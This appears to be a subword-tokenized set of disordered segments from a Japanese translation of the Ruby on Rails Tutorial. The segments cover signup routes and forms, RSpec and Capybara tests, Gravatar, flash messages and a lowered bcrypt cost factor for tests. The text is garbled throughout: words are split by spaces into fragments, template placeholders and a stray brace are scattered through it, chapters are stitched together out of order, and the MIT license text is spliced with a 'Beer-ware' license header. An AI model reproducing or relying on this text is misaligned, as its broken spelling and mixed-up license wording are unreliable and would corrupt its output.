▁{0} 図 5 . 8 {/0} ▁{1} \ href { http :// localhost :3000/ about }{/ about } で 表示される About ページ {/1}
▁\ href { http :// rack . ruby f org e . org / doc /}{ Rack ミドルウェア } 用の 設定 ファイル
▁ route ▁get ▁" users / new "
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ サインアップ ページ への テスト を含む 最初の users 用 spec 。
▁ い つ も と同様 、 これらの テストを 以下のように \ ko de { rspec } コマンドで 実行 できます 。
▁上の ように 特定の ファイルを 1 つ 渡す 代わりに 、 以下のように request s ディレクトリ 全体 を 渡す と 、 すべての リクエスト spec のテスト を 実行 できる ことを 覚 え ておく と 良い でしょう 。
▁上の パターン から 、 それ以外の ディレクトリ を含む \ emph { すべて } の spec を実行する 以下の 方法 も 容易に 想 像 が つ く と思います 。
▁ 完 全 を 期 して 、 今後 は チュートリアル の最後 まで 基本的に 上の 方法 を使用して テストを フル 実行 します 。
▁なお 、 Rake タスク で \ ko de { spec } の テストスイート を 実行 できる ことも 覚 え ておく と よいでしょう ▁( 他の 開発者 が 使っている の を見 た こと がある かもしれません )。
▁( 実際には \ ko de { rake } と タイプ する だけで 済み ます 。 \ ko de { rake } の デフォルトの 動作 は テストスイート の 実行 です )。
▁ Users コントローラ は 、 作成 時に 既に \ ko de { new } アクション を 持 っている ため 、 後 は テストを パス させる ために 正しい ルート と ビュー の 中 身 を作成 すれば よい のです 。
▁ これはリスト \ ref { code : generate _ users _ controller } で使用されていま した 。
▁ 残 っている 作業 は 、 Home ページの ボタン に 適切な リンク を追加する ことです 。
▁ これはリスト \ ref { code : home _ page _ signup _ link } で使用されていま した 。
▁ Git を 使っている 方は 、 この時点で master ブランチ に変更 を マージ してください 。
▁これで 、 本番環境 の サーバー で サンプルアプリケーション が 動作 している はずです 。
▁{0} 図 5 . 1 {/0} {1} サンプルアプリケーションの Home ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / home _ page _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁しかし ながら 、 道 具 の 使い 方 を 覚 え ること が 職 人 にとって 当 然 の 心 得 である ように 、 使用する ツール について 学ぶ ことは 大 切 な ことです 。 払 った 努 力 に 見 合 う 見 返 り は 必ず あります 。
▁{0} 図 1 .2{/0} {1} 新規作成 された Rails アプリケーションの ディレクトリ 構造 。 \ href { http :// railstutorial . org / images / figure s / directory _ structure _ rails _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 5 .2{/0} カスタム CSS を使用 していない {1} Home ページ ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home })。 \ href { http :// railstutorial . org / images / figure s / layout _ no _ log o _ or _ custom _ css _ bootstrap _ rails _ 4 - full . png }{( 拡大 ) }{/1}
▁{0} 図 5 . 3 {/0} {1} Bootstrap ▁ CSS と サンプルアプリケーション 。 \ href { http :// railstutorial . org / images / figure s / sample _ app _ only _ bootstrap _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 5 . 4 {/0} {1} スペース や 共通 スタイル を追加した 結果 。 \ href { http :// railstutorial . org / images / figure s / sample _ app _ un i ver s al _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 5 . 5 {/0} {1} タ イ ポ グ ラ フ ィ ー スタイル を追加する 。 \ href { http :// railstutorial . org / images / figure s / sample _ app _ t y p o gra ph y _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 1 . 3 {/0} ▁{1} デフォルトの Rails ページ 。 \ href { http :// railstutorial . org / images / figure s / r id ing _ rails _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 1 . 4 {/0} ▁{1} アプリケーション 環境 が表示されている デフォルト ページ 。 \ href { http :// railstutorial . org / images / figure s / r id ing _ rails _ environment _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 5 . 6 {/0} {1} デザイン された ロ ゴ と サンプル アプリ 。 \ href { http :// railstutorial . org / images / figure s / sample _ app _ log o _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 1 . 6 {/0} {1} アカウント 作成 直 後 の GitHub ページ 。 \ href { http :// railstutorial . org / images / figure s / create _ first _ re p o s it or y _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 5 . 7 {/0} {1} Home ページ ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static _ pages / home }) ▁ に フ ッ ター を追加する 。 \ href { http :// railstutorial . org / images / figure s / site _ with _ footer _ bootstrap _4_0 - full . png }{( 拡大 ) }{/1}
▁この チュートリアル 構成 は 、 Michael ▁ E r as m us による 素晴らしい ブログ 記事 「\ href { http :// 2 b e ar d s . net / 20 11 / 11 / the - rails - 3 - asset - pipeline - in - about - 5 - minute s /}{ 5 分 で わ か る Rails ▁3 の Asset ▁Pipeline } ▁( 英語 )」 を も と に しています 。
▁{0} 図 1 . 7 {/0} {1} GitHub の リポジトリ ページ 。 \ href { http :// railstutorial . org / images / figure s / github _ re p o s it or y _ page _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 1 . 8 {/0} {1} GitHub 上の 、 無 用 な 初期 の \ ko de { README } ファイル 。 \ href { http :// railstutorial . org / images / figure s / rails _ read me _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 1 .9{/0} ▁{1} M ar k d own を使用して フォーマット された 改良 版 \ ko de { README } ファイル 。 \ href { http :// railstutorial . org / images / figure s / new _ read me _4_0 - full . png }{( 拡大 ) }{/1}
▁ Heroku 上で 動作 している Rails チュートリアル の最初の アプリケーション 。 \ href { http :// railstutorial . org / images / figure s / heroku _ app _4_0 - full . png }{( フル サイズ ) }
▁{0} 図 1 . 11 {/0} {1} 見 事 な Heroku の インターフェイス 。 \ href { http :// railstutorial . org / images / figure s / heroku _ info _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 5 . 8 {/0} {1} \ href { http :// localhost :3000/ about }{/ about } で 表示される About ページ 。 \ href { http :// railstutorial . org / images / figure s / about _ page _ style d - full . png }{( 拡大 ) }{/1}
▁{0} 図 5 .9{/0} {1} \ href { http :// localhost :3000/ signup }{/ signup } で 表示される 新しい サインアップ ページ ▁ 。 \ href { http :// railstutorial . org / images / figure s / new _ signup _ page _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ 前 書き
▁ 私 自身 、 章 の 終わり にある 練 習 問題 も や り ながら 、 この ▁\ emph { Rails ▁ チュートリアル } を 3 日 間 かけ て 一 気 に 読 破 しました 。
▁ 謝 辞
▁ 著者
▁\ href { http :// michael hartl . com /}{ マ イ ケ ル ハ ート ル ▁( Michael ▁Hartl ) } ▁ は 、 「\ href { http :// ruby . railstutorial . org /}{ \ emph { Ruby ▁on ▁Rails ▁ チュートリアル } }」 という 、\ href { http :// rubyonrails . org /}{ Ruby ▁on ▁Rails } ▁ を使って 初めて ▁Web ▁ アプリケーションを 開発 する 際に 最も よく 参 考 に される 本 の 著者 です 。
▁ 著 作 権 と ラ イ セ ン ス
▁ Co p y right ▁( c ) ▁20 1 3 ▁ Michael ▁Hartl
▁P e rm is s ion ▁is ▁ her e by ▁ gra n t ed , ▁ free ▁of ▁ cha r g e , ▁to ▁ any ▁ person
▁ o b t a in ing ▁a ▁ co p y ▁of ▁this ▁ s of t w ar e ▁and ▁ associate d ▁ document ation
▁< n > file s ▁( the ▁" S of t w ar e ") , ▁to ▁ de al ▁in ▁the ▁S of t w ar e ▁with out ▁ re st ri c tion ,
▁< n > in c l u d ing ▁with out ▁ limit ation ▁the ▁ right s ▁to ▁use , ▁ co p y , ▁ mod if y , ▁ merge ,
▁< n > publish , ▁d ist ri b u te , ▁ sub li ce n s e , ▁and / or ▁ s e ll ▁ co p ies ▁of ▁the ▁S of t w ar e ,
▁< n > and ▁to ▁ per m it ▁ person s ▁to ▁ w h o m ▁the ▁S of t w ar e ▁is ▁f ur n i sh ed ▁to ▁do ▁ s o ,
▁ subject ▁to ▁the ▁ following ▁ con d it ions : < n >< n > The ▁a b o ve ▁ co p y right ▁ no tic e ▁and ▁this ▁ per m is s ion ▁ no tic e ▁ sh all ▁be
▁< n > include d ▁in ▁ all ▁ co p ies ▁ or ▁ sub st an t i al ▁ port ions ▁of ▁the ▁S of t w ar e .
▁* ▁" THE ▁B E ER - W A RE ▁ L I C E N S E " ▁( Re v is ion ▁4 2 ) :
▁* ▁ Michael ▁Hartl ▁ w r o te ▁this ▁ code .
▁\ ref { sec : signup _ success } でも 説明します が 、 ユーザーの 作成 で 重要な のは \ ko de { input } ごとに ある 特殊な \ ko de { name } 属性 です 。
▁Rails は これらの \ ko de { name } の値 を使用して 、 初期化 ハッシュ を ▁(\ ko de { params } 変数 経由で ) ▁ 構成 します 。 この ハッシュ は 、 ユーザーが 入力 した 値 に基づいて ユーザー を作成する とき ▁(\ ref { sec : signup _ failure }) ▁ に 使用されます 。
▁ 前 者 の 問題 を \ ref { sec : signup _ error _ messages } で 、 後 者 の 問題 を \ ref { sec : signup _ success } で それぞれ 解決 していきます 。
▁ 保存 に 失敗した場合 は 、 単 に \ ref { sec : signup _ failure } で 開発 した とおり の動作 が 実行 { されます 。
▁User モデル が でき あ が った ので 、 いよいよ Web サイトに なく て は な らない ユーザー登録 機能 を追加しましょう 。
▁ これまで と同様 、 開発 と 同時に テスト も 作成 します 。 RSpec と Capybara の 適 用 範囲 を 拡大 し 、 簡潔 かつ 表現 力 豊 か な 結合 テスト を作成します 。
▁ 登録 していない 場合は 、 上 記 を参照 して 登録 して おいてください 。
▁{0} 図 7 . 1 {/0} {1} この節 で 作成する ユーザー プロファイル のモックアップ 。 \ href { http :// railstutorial . org / images / figure s / profile _ mockup _ profile _ name _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 7 .2{/0} {1} 理 想 と する 最終的な プロファイル ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / profile _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 7 . 3 {/0} {1} サンプルアプリケーションの Home ページ ▁(\ href { http :// localhost :3000/ }{/ }) ▁ に デバッグ情報 を表示する 。 \ href { http :// railstutorial . org / images / figure s / home _ page _ with _ debug _4_0 - full . png }{( 拡大 ) }{/1}
▁ 特に 、\ ko de { Rails . env . development ?} が \ ko de { true } になる のは 開発環境 に 限 られ るため 、 以下の 埋め込み Ruby
▁{0} 図 7 . 4 {/0} {1} / users /1 にアクセス した 時の エラー ページ 。 \ href { http :// railstutorial . org / images / figure s / profile _ routing _ error - full . png }{( 拡大 ) }{/1}
▁ REST スタイル の URL を有効に するには 、 routes ファイル ▁(\ ko de { config / routes . rb }) に 以下の 1 行 を追加します 。
▁ これはリスト \ ref { code : signup _ route } で使用されていま した 。
▁リスト \ ref { code : users _ resource } のコード を使用することで 、 ルーティング が 有効 になります 。 ただし 、 ルーティング 先 の ページ はまだ ありません ▁( 図 \ ref { fig : user _ show _ un k now n _ action _ 4 })。
▁{0} 図 7 . 5 {/0} {1} U R I ▁ / users /1 の ルーティング は 有効 だ が ページ がない 状態 。 \ href { http :// railstutorial . org / images / figure s / user _ show _ un k now n _ action _ 4 - full . png }{( 拡大 ) }{/1}
▁この ビュー では 埋め込み Ruby を使用して ユーザー名 と メールアドレスを 表示 しています 。 インスタンス変数 \ ko de {@ user } がある ことを前提とし ています 。
▁もちろん 、 ユーザー表示ページ の 最終的な 状態 は これ とは 大きく 異なります し 、 この メールアドレス が この ま ま 一般に 公開 される ようなこと も ありません 。
▁ 図 \ ref { fig : user _ show _ rails _ 3 } の デバッグ情報 で \ ko de { params [: id ]} の 値を 確認 できる ことに も 注目してください 。
▁{0} 図 7 . 6 {/0} {1} Users リソース 追加 後 の \ href { http :// localhost :3000/ users /1 }{/ users /1 } の ユーザー表示ページ 。 ▁\ href { http :// railstutorial . org / images / figure s / user _ show _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ Factory ▁Girl を使用した テスト を実行し てみると すぐ に 気 が 付 く と思います が 、 正 直 言 って \ emph { 遅 い } です 。
▁これは Factory ▁Girl に 問題 がある わ け ではなく 、 あ く まで \ emph { 機能 } の一部 であり 、 バグ ではありません 。
▁ 残念ながら 、 このままでは ユーザーの 作成 を そのまま テスト に含め ると 遅 く な ってしまいます 。 幸 い な ことに 、 この問題 は 簡単に 回 避 できます 。
▁\ text tt { bcrypt - ruby } ライブラリ では 、 セキュア ハッシュ を生成する 際 の 計算 の 負 荷 を \ emph { コ スト フ ァ ク ター ▁( co st ▁ factor ) ▁ } として 指定できます 。
▁ コ スト フ ァ ク ター の デフォルト値 は 速 度 より セキュア であることを 重 視 しています 。 これは 本番環境で は 最 適 ですが 、 テスト 環境で は 不 利 です 。 私 た ち は テストを \ emph { 高速 で } 行 いた い の であり 、 ユーザーの パスワード ハッシュの セキュリティ については テスト 中 は 気 に した く ありません 。
▁self を省略した 結果を リスト \ ref { code : test _ bcrypt _ co st _ factor } に示します 。
▁# ▁ bcrypt ' の コ スト 関数 を 下 げ ること で テスト の 速 度 を 向 上 させる 。
▁ ビュー を作成する とき は 、 ページの 構造 が 正 確 である かどうか よりも ページの 外 観 の 方 を 重要 視 する の が 普通 なので 、 少なくとも 今 は ビュー をテストする 必要はありません 。
▁もちろん 、 映 画 「\ href { http :// www . im db . com / title / tt 04 99 5 4 9 /}{ ア バ ター }」 を見 た 人 には こ ん な 解 説 は 不 要 でしょう 。
▁ Gravatar は \ href { http :// github . com /}{ GitHub } の 共 同 設 立 者 である To m ▁P re st on - W er n er によって 開発 され 、 後に \ href { http :// auto m at tic . com /}{ A u to m at tic } ▁(\ href { http :// word pre s s . com /}{ Word P r ess } の 作 者 ) ▁ に 買 い 取 られ ました 。 Gravatar は 無料 の サービス で 、 プロファイル 写 真 を アップロード して 、 指定 した メールアドレス と 関連付け ることができます 。
▁ この時点で は 、 以下の テストスイート は 失敗 するはずです 。
▁\ ko de { gravatar _ for } メソッドが 未 定義 の ため 、 ユーザー 表示 ビュー は 現在 動作 していません 。
▁( このような エラー を 捉 え る ことができる の が 、 ビューで S p ec s を使用する 大きな メ リ ッ ト です 。
▁ だ から こ そ 、 どんな に 小 規 模 であっても よい ので ビューで \ emph { 何らかの } テスト を行って お く ことが 重要な のです 。 )
▁\ href { http :// en . gravatar . com / site / im p le m ent / hash /}{ Gravatar の ホ ー ム ページ } にも 書かれてい るように 、 Gravatar の URL は \ href { http :// en . w ikipedia . org / wiki / M D 5 } { M D 5 ハッシュ } を 用 いて ユーザーの メールアドレスを ハッシュ化 しています 。
▁# ▁ Re t ur n s ▁the ▁ Gravatar ▁( http :// gravatar . com / ) ▁for ▁the ▁ g ive n ▁ user .
▁今度は 以下の テストスイート は 成功 するはずです 。
▁{0} 図 7 . 7 {/0} {1} ユーザー プロファイル ページ \ href { http :// localhost :3000/ users /1 }{/ users /1 } に デフォルトの Gravatar が表示されている 。 \ href { http :// railstutorial . org / images / figure s / profile _ with _ gravatar _ bootstrap _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 7 . 8 {/0} {1} ユーザー表示ページ に カスタム の Gravatar を表示する 。 \ href { http :// railstutorial . org / images / figure s / profile _ custom _ gravatar _ bootstrap _4_0 - full . png }{( 拡大 ) }{/1}
▁\ ko de { row } クラス と \ ko de { span 4 } クラス も 追加 しておきます 。 これらの クラス は Bootstrap の一部 です 。
▁{0} 図 7 .9{/0} {1} ユーザー表示ページ \ href { http :// localhost :3000/ users /1 }{/ users /1 } に サイドバー と CSS を追加する 。 \ href { http :// railstutorial . org / images / figure s / user _ show _ s id e bar _ css _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 7 . 10 {/0} {1} 現 状 の ユーザー登録ページ ▁\ href { http :// localhost :3000/ signup }{/ signup } 。 \ href { http :// railstutorial . org / images / figure s / new _ signup _ page _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 7 . 11 {/0} {1} ユーザー登録 ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / signup _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁Web 経由で ユーザー を作成する 機能を これ から 追加 します ので 、\ ref { sec : creat ing _ a _ user } で作成した ユーザーを ここで 削除 しておきましょう 。
▁ 完全な テスト 機能を 備 え た 強力な Web フレームワーク が なかった 頃 は 、 テスティング 作業 は 苦 痛 に 満 ち 、 し ば し ば そこで エラーが発生し ました 。
▁ RSpec と Capybara を使用することで 、 柔 軟 性 の 高 い テスト を作成 できるように なり 、 従来 手動で 行う しか なかった これらの テストを 自動 化 できるようになりました 。
▁ 私 た ち は 、 既に Capybara が Web 操作 の 文法 を 直 感 的に サポート している ところ を 目 の 当 たり に し てきました 。
▁ 目 標 は 、 正しく ない ユーザー登録 情報 と 正しい ユーザー登録 情報を 与え たとき に 、 期待どおり に 動作する ことを確認する テスト の作成 です 。
▁この テストは かなり 込 み 入 っている ので 、 1 つ 1 つ 作り 上 げ て い き ましょう 。
▁ 最初の タスク は 、 ユーザー登録フォーム の 表示 が 失敗 しない かどうか 、 そして ページ を表示し 、 ボタン を 押 し 、 無効な データを 送信 する 動作 を シ ミ ュ レ ート することです 。 ボタン を 代わりに 押 す には \ ko de { c li c k _ button } を使用します 。
▁この テストは 、 ユーザー登録ページ を ブラウザで 表示 し 、 ユーザー登録 情報 に 何も 入力 しない ま ま 送信 する 操作 ▁( 無効な 操作 ) ▁ と 同 等 です 。
▁ 同様に 、 有効な データを 送信 する 操作 を シ ミ ュ レ ート するには 、 ▁\ ko de { fi ll _ in } を使用して 正しい ユーザー情報 を 与え ます 。
▁この テスト の 目的 は 、 ユーザー登録 ボタン を 押 したときに 期待どおり に 動作 すること 、 ユーザー情報 が 有効な 場合には ユーザーが 新規作成 され 、 無効な 場合には ユーザー が作成され ない ことを確認する ことです 。
▁ この節 の 冒 頭 で データベース を リセット して あるので 、 現時点では \ ko de { User . count } は \ ko de { 0} になっています 。
▁ 無効な データ を送信し た場合 、 ユーザーの カウント が 変 わ らない ことが 期 待 されます 。 有効な データを 送信 した 場合には 、 ユーザーの カウント が 1 つ 増え ること が 期 待 されます 。
▁ このような 動作 は 、 RSpec で \ ko de { ex p e ct } メソッドを \ ko de { to } メソッド または ▁\ ko de { not _ to } メソッドと 組み合わせ て 実現 できます 。
▁まずは 、 確認 し やすい 無効な 場合 について や って みましょう 。 ユーザー登録ページ の パス を ブラウザで 開 いて ボタン を クリック した ら 、 ユーザー アカウント が 変更 \ emph { され ない } という 動作 です 。
▁これは \ ko de { change } メソッドで 役 に 立 ち ます 。 このメソッドは オブジェクト と シンボル を 引数に 取り 、 シンボル を 呼び出し た 結果を 計算 して オブジェクト 上の メソッドと します 。 これは ブロック の 前 と 後 いずれ についても 行われます 。
▁ 以下 を 計算 します 。
▁上の 計算 は 、 以下の 実行 前 と 実行 後 の 両方 で 行われます 。
▁ この場合は 、 コードが カウント を変更 \ emph { しない } ことが 期 待 されます ので 、\ ko de { not _ to } メソッドで 表現 しています 。
▁ 実際には 、 以下の 同 等 の コードを
▁ ボタン クリック を ブロック で 囲 む こと によって 以下のように 1 行 で 表 しています 。
▁ こうすることで 英語 に 近 い 自 然 な 表 記 が 可能 になり 、 さらに コ ン パ ク ト になります
▁(\ ko de { e q } は 同 値 性 をテストする RSpec の メソッド です )。
▁ データ が 有効な 場合 のテスト も 大きな 違 い はありません が 、 今度は カウント が 更新 され ない の ではなく 、 カウント が 1 つ 増え る ことを確認します 。
▁ここでは \ ko de { to } メソッドを使用して 、 正しい データ を与えて ユーザー登録 ボタン を 押 したときに カウント が 1 つ \ emph { 増え る } ことを確認します 。
▁self を省略した 結果を リスト \ ref { code : basic _ signup _ tests } に示します 。
▁ここでは 、 送信 ボタン 用の 共通 部分を 分 解 するために \ ko de { let } メソッドを使用して \ ko de { submit } 変数 を定義し ています 。
▁ ユーザー登録 の 基本的な テスト 。
▁ テストにパス するには 、 ユーザー登録ページ を 正しい HTML 要素 で 作成 し 、 ページの 送信 が 正しい 場所 へ ルーティング される ように し 、 ユーザー データ が 正しい 場合に のみ 新しい ユーザーを 作成 できるように する必要があります 。
▁もちろん 、 今 の 時点 では テストは 失敗 します 。
▁ テスト が正しく 失敗した ので 、 今度は ユーザー登録 の \ emph { フォーム } を作成して テストにパス する ように しましょう 。
▁作成した コードをリスト \ ref { code : signup _ form } に示します
▁( Rails ▁2 . x に 慣 れ ている 方は 、\ ko de { form _ for } では コンテンツ を 挿 入 するときに ▁“ %= ” ▁ を使用する ER b 方 式 の 文法 を 使用している ことに注意してください 。
▁この フォームの 各 部分 について 見 てみましょう 。
▁\ ko de { do } キーワード は 、 ▁\ ko de { form _ for } が 1 つの 変数 を持つ ブロック を 取 ること を表し ます 。 この 変数 \ ko de { f } は ▁“ form ” ▁ の f です 。
▁ 通常 、 Rails ヘルパー を 使用している 場合 、 実装 の詳細 について 知 っ ておく 必要はありません 。 ただし \ emph { f } という オブジェクトが \ ko de { 何 を する のか } は 知 っ ておく 必要があります 。 ▁\ href { http :// www . w 3 s ch o ol s . com / html / html _ form s . as p } { HTML フォーム 要素 } ▁( テキスト フィールド 、 ラ ジ オ ボタン 、 パスワード フィールド など ) ▁ に対応する メソッドが 呼び出される と 、\ emph {@ user } ▁ オブジェクトの 属性 を設定する ように 特 別 に 設計 された 要素 のための コード を返します 。
▁( この \ ko de { - e } オプションは 、 de script ion の 文字列 が \ ko de { " signup ▁ page "} に 一致する 例 を 単 に 実行 する ためのものです 。
▁ これはリスト \ ref { code : basic _ signup _ tests } で使用されていま した 。
▁ テストにパス して フォーム が 正常に 出力 される ように するには 、\ ko de { new . html . erb } に対応する \ ko de {@ user } 変数 を コントローラのアクション で 定義 する必要があります 。 たとえば 、 Users コントローラの \ ko de { new } が そう です 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁\ ko de {@ user } 変数 が 上 記 のように 定義 され れば 、 以下の ユーザー登録ページ のテスト は パス するはずです ▁( 訳 注 : ▁以下の コマンド では ▁" signup ▁ page " ▁ のテスト だけ を 行 な っています )。
▁{0} 図 7 . 12 {/0} {1} 新規ユーザー のための ユーザー登録フォーム \ href { http :// localhost :3000/ signup }{/ signup } 。 \ href { http :// railstutorial . org / images / figure s / signup _ form _ bootstrap - full . png }{( 拡大 ) }{/1}
▁この HTML の 細 か い 部分 は ほとんど 私 た ち の 目的 には 関係 ありません が 、 この 構造 の 最も 重要な 部分 に 注 目 してみましょう 。
▁( 実は 、 この ソース から は \ emph { 信 頼 性 トークン ▁( a u the n tic ity ▁ token ) ▁ } 関連 の HTML を 除 外 して あります 。 Rails は 、 ある 種 の \ emph { ク ロ ス サイト リクエスト 偽 造 } ▁( CSRF : ▁c r o s s - site ▁ request ▁for g e ry ) ▁ 攻撃 に 対 抗 するために このような HTML を 自動的に 追加 します 。
▁ 動作 の詳細 や 、 この 防 御 が 重要な 理由 を 知りたい 場合は 、 S t ack ▁ O ver flow の \ href { http :// st ack o ver flow . com / que st ions / 9 4 1 59 4 / u nder st and - rails - a u the n tic ity - token } { Rails 信 頼 性 トークン 関連 の 書き 込 み } ▁( 英語 ) ▁ を参照してください 。
▁{0} 図 7 . 1 3 {/0} {1} \ ko de { text } フィールド と \ ko de { password } フィールド に 文字 を 入力 した 状態 。 \ href { http :// railstutorial . org / images / figure s / fi ll ed _ in _ form _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 7 . 14 {/0} {1} ユーザー登録 が 失敗した とき のモックアップ 。 \ href { http :// railstutorial . org / images / figure s / signup _ failure _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁リスト \ ref { code : basic _ signup _ tests } のとき
▁ コメント にも ある ように 、 上のコード はまだ 実装 が 完了 していません ので 注意 してください 。 しかし 実装 の 出 発 点 として は これ で 十分 です 。
▁ ユーザー登録 失敗 。 \ href { http :// railstutorial . org / images / figure s / signup _ failure _ rails _ 4 - full . png }{( フル サイズ ) }
▁ ユーザー登録 失敗 時の デバッグ情報 。 \ href { http :// railstutorial . org / images / figure s / signup _ failure _ rails _ 4 _ debug - full . png }{( フル サイズ ) }
▁ 関連する 以下の テストが 失敗する ことを確認する ことで 、 この ことを ダ ブ ル チェック できます 。
▁- e ▁" signup ▁with ▁ invalid ▁ information "
▁ 以前の バージョンの Rails では 、\ ko de { モデル } 層 で \ emph { attr _ access i b le } メソッド を使用することで 上 のような 危 険 を 防止 していました が 、 ▁Rails ▁4.0 では コントローラ 層 で \ ko de { S trong ▁Parameters } という テクニック を使用すること が 推 奨 されています 。
▁ ユーザー登録 に 失敗した場合 の 最後の 手順 として 、 問題が生じ た ために ユーザー登録 が行われ なかった ということ を ユーザーに わかりやすく 伝 え る エラーメッセージ を追加しましょう 。
▁self を省略した 結果を リスト \ ref { code : f _ error _ messages } に示します 。
▁ これはリスト \ ref { code : errors _ partial } で使用されていま した 。
▁{0} 図 7 . 17 {/0} {1} ユーザー登録 失敗 時の エラーメッセージ 。 \ href { http :// railstutorial . org / images / figure s / signup _ error _ messages _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ テスト の 結果を 図 \ ref { fig : blank _ signup _ password _ digest } に示します 。
▁今度は 期待どおり テストにパス するはずです 。
▁{0} 図 7 . 18 {/0} {1} \ href { http :// localhost :3000/ signup }{/ signup } を表示し て 何も 入力 せずに ▁[ Create ▁ my ▁ account ] ▁ を クリック する 。 \ href { http :// railstutorial . org / images / figure s / blank _ signup _ password _ digest _ bootstrap _4_0 - full . png }{( 拡大 ) }{/1}
▁{0} 図 7 . 19 {/0} {1} ユーザー登録 に 成功 した 画面 のモックアップ 。 \ href { http :// railstutorial . org / images / figure s / signup _ success _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ 現時点では 、 以下の 有効な 送信 テストは 失敗 するはずです 。
▁Rails の デフォルトの アクション は 対応する ビュー を表示する ようになっています が 、\ ko de { create } アクション に対応する ビュー の テンプレート がない ▁( ある は ず が ありません ) ▁ ため 、 テスト に 失敗 します 。
▁ここでは 、 登録 後に 別の ページ を表示する ように し 、 その ページ が 新規作成 された ユーザー プロファイル であること が わかるように します 。
▁ リダイレクト では \ ko de { user _ url } を省略 し 、 単 に \ ko de { redirect _ to ▁@ user } と 書 け ば ユーザー表示ページ に移動し ます 。
▁ いよいよ ブラウザで 正しい ユーザー情報 を 登録 できるようになりました が 、 その 前に Web アプリケーションに 常 識 的に 備 わ っている 機能を 追加 してみましょう 。 登録 完了 後に 表示される ページに メッセージ を表示し ▁( この場合は 新規ユーザー への ウ ェ ル カ ム メッセージ ) 、 2 度 目 以降 には その ページに メッセージ を表示し ないように する という ものです 。
▁Rails では 、 こう い う 場合に \ emph { flash } という 特殊な 変数 を使用できます 。 この 変数 は ハッシュ のように 扱 う ことができます 。
▁たとえば 、\ ko de { flash [: success ] ▁= ▁" Welcome ▁to ▁the ▁ Sample ▁A p p ! "} と する 場合 、 以下のコード を実行すると
▁以下の HTML が 生成されます 。
▁( ハッシュの \ ko de { : success } キー は シンボル である 点 に 注目してください 。 Ruby は シンボル を 自動的に ▁\ ko de { " success "} ▁という 文字列 に変換 して から テンプレート に 挿 入 します 。 )
▁ 使用する すべての キー と 値を 列 挙 する 理由 は 、 他の フラッシュメッセージ も 使えるように する ためです 。
▁self を省略した 結果を リスト \ ref { code : signup _ flash } に示します 。
▁ つ い に 、 ユーザー登録 が 完成 しました 。 名前 : ▁“ Rails ▁Tutorial ” 、 メールアドレス : ▁“ \ text tt { example @ railstutorial . org } ” と でも 登録 してみましょう 。
▁{0} 図 7 . 20 {/0} {1} ユーザー登録 が 成功 し 、 フラッシュメッセージ が表示される 。 \ href { http :// railstutorial . org / images / figure s / signup _ flash _ bootstrap - full . png }{( 拡大 ) }{/1}
▁{0} 図 7 . 2 1 {/0} {1} ブラウザで ページを 再 読み込み して フラッシュメッセージ が表示され な くなる 。 \ href { http :// railstutorial . org / images / figure s / signup _ flash _ reload ed _ bootstrap - full . png }{( 拡大 ) }{/1}
▁今度は データベース を 覗 いて 、 新規ユーザー が 確 か に 登録 されている ことを ダ ブ ル チェック しましょう 。
▁ created _ at : ▁" 20 1 3 - 0 3 - 12 ▁0 5 : 5 1 : 3 4 ", ▁ updated _ at : ▁" 20 1 3 - 0 3 - 12 ▁0 5 : 5 1 : 3 4 ",
▁ password _ digest : ▁" $ 2 a $ 10 $ A 5 8 / j 7 w w h 3 a A f f G k M A O 9 Q . j j h 3 js h d . 6 a k h ... "
▁{0} 図 7 . 22 {/0} {1} 本番 Web で 動作 中 の ユーザー登録ページ 。 ▁\ href { http :// railstutorial . org / images / figure s / signup _ in _ production _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ これはリスト \ ref { code : f _ error _ messages } で使用されていま した 。
▁ これはリスト \ ref { code : error _ messages _ test } で使用されていま した 。
▁ お勧め の エラーメッセージ テスト 。
▁\ ko de { create } アクション で 保存 が 行われた 後 の動作 をテストする 。
▁これにより 、 サインイン の 状態 と 現在のユーザー id に応じて 動作 を変更 できるようになります 。
▁たとえば 、 この章 では 、 サイトの ヘッダー 部分 に サインイン / サインアウト の リンク と プロファイル へのリンク を表示する ようにします 。
▁ ユーザーが サインイン することで セキュリティ モデル も 実装 され 、 サインイン している ユーザー id に基づいて 、 特定の ページ への アクセス を 制限 することもできます 。
▁ 特に 、 2 つの 開発 手法 を 比 較 するために 、 RSpec による 結合 テスト の 組み合わせ を Cucumber で 再 実装します 。
▁\ href { http :// en . w ikipedia . org / wiki / Session _ ( com put er _ sc i en ce ) }{\ emph { セッション } } とは 、 2 つの コンピュータ の 間 、 たとえば クライアント 側 の ブラウザ と サーバー で 動作 している Rails と の 間 の 、 半 永続的 な 接続 の ことです 。
